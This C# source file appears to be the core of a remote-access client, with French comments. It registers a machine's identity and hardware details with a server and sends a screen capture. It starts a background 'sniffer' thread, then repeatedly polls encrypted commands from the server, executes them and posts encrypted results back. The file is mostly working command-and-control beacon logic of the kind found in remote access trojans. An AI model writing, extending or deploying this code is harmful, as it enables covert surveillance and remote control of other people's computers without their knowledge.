using ClIENT_PC.Controller;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ClIENT_PC
{
    class principale
    {
        public principale ()
		{
            Router.load();
            bool ok = false;
            while (!ok)
            {
                if (premier())
                {
                    minutereur.Interval = Parametre.tempActu;
                    minutereur.Tick += new EventHandler(minuterie_action_Ecouler);
                    minutereur.Enabled = true;
                    ok = true;
                }
            }
		}
        System.Windows.Forms.Timer minutereur = new System.Windows.Forms.Timer();
        private HttpRequester hr = new HttpRequester();
        private Dispatcher dis = new Dispatcher();

		private void minuterie_action_Ecouler(object sender, EventArgs e)
		{
            minutereur.Stop();
            /*Thread th = new Thread(() =>
            {*/
                string reponse = dis.Get();
                Parametre.dernierCMD = reponse;
                var serializer = new JavaScriptSerializer();

                dynamic data = serializer.DeserializeObject(reponse);
                string json = Encryption.Decrypt(Parametre.encryptionKey, data["d"]);
                data = serializer.DeserializeObject(json);

                string packet = string.Empty;
                foreach (dynamic item in data["commands"])
	            {
                    /************** ON EXECUTE ****************/
                    packet = dis.Dispatch(item);
                    if (!string.IsNullOrEmpty(packet))
                    {
                        //On rajoute la requete
                        dynamic req = serializer.DeserializeObject(item["content"]);
                        
                        //On injecte controller et method dans content pour le callback <==>
                        Dictionary<string, string> paq = new Dictionary<string, string>();
                        paq.Add("controller", req["controller"]);
                        paq.Add("method", req["method"]);
                        paq.Add("data", packet);
                        packet = serializer.Serialize(paq);
                        
                        //On rassemble en un paquet et on ajoute l'admin id
                        string result = serializer.Serialize(new { admin_id = item["admin_id"], pc_id = data["pc_id"], content = packet });
                        //On envoie le paquet crypter
                        result = "d=" + HttpUtility.UrlEncode(Encryption.Encrypt(Parametre.encryptionKey, result));
                        dis.Send(result);
                    }
	            }
                
                /*});
                th.Start();*/
                minutereur.Start();
		}
	
        public bool premier()
        {
            InfosPcController gi = new InfosPcController();
            Console.WriteLine("--> Premier");
            var serializer = new JavaScriptSerializer();
            string dCrypt = serializer.Serialize(new
            {
                guid = gi.getUqGuid(),
                name = Environment.MachineName,
                os = gi.getOs(),
                ram = gi.getMemoire(),
                processor = gi.getProcesseur() 
            });
            string donne = "d=" + HttpUtility.UrlEncode(Encryption.Encrypt(Parametre.encryptionKey, dCrypt));
            string reponse = hr.post(Router.url("auth"), donne);
            dynamic result = serializer.DeserializeObject(reponse);
            string json = Encryption.Decrypt(Parametre.encryptionKey, result["d"]);
            dynamic data = serializer.DeserializeObject(json);

            if (data["success"] == true)
            {
                Parametre.API_KEY = Convert.ToString(data["api_key"]);
                Parametre.tempActu = Convert.ToInt16(data["refresh_time"]);

                if (Parametre.API_KEY != string.Empty && Parametre.API_KEY != null)
                {
                    EcranController ecr = new EcranController();
                    ecr.SendScreenMin();

                    new Thread(() =>
                    {
                        SniffeurController snf = new SniffeurController();
                        snf.Start();
                    }).Start();

                    minutereur.Enabled = true;
                    minutereur.Start();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else { return false; }
        }
    }
}
